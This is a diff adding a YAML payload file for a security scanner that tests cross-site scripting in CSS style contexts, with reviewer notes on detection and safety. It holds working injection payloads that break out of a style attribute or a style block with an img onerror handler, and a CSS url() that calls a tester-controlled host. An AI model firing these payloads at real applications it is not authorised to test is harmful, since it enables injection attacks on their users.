@@ -1,0 +1,27 @@
+# A style context, and the markup boundary that ends it. The marker is computed
+# or unique, never a literal the request also carries; a reflected proof may
+# raise a dialog, a stored one may not.
+id: xss/css
+title: Style context boundaries
+reviewed: "2026-08-31"
+variables: [MARKER, HOST]
+safety: >-
+  Nothing here hides, moves or overlays a page control. A stored style payload
+  that changes what other users can operate is a change to the application, not
+  an observation of it.
+entries:
+  - name: leave a style attribute
+    payload: "\"><img src=x onerror=console.log('{{MARKER}}')>"
+    detect: "Where the value is inside a style attribute, the attribute's quote and the tag are what end the context."
+
+  - name: leave a stylesheet block
+    payload: "</style><img src=x onerror=console.log('{{MARKER}}')>"
+    detect: "The parser ends the element on the literal text, whatever the CSS around it says."
+
+  - name: declaration terminator
+    payload: "red;background:url({{HOST}}/{{MARKER}})"
+    detect: "A request arriving at the tester's host proves the declaration was accepted. This is style control rather than script execution -- a finding for the CSS injection topic, recorded and handed there."
+
+  - name: encoder control
+    payload: "{{MARKER}}<>\""
+    detect: "Read the raw body: what survives here decides which of the two boundary entries above can work at all."
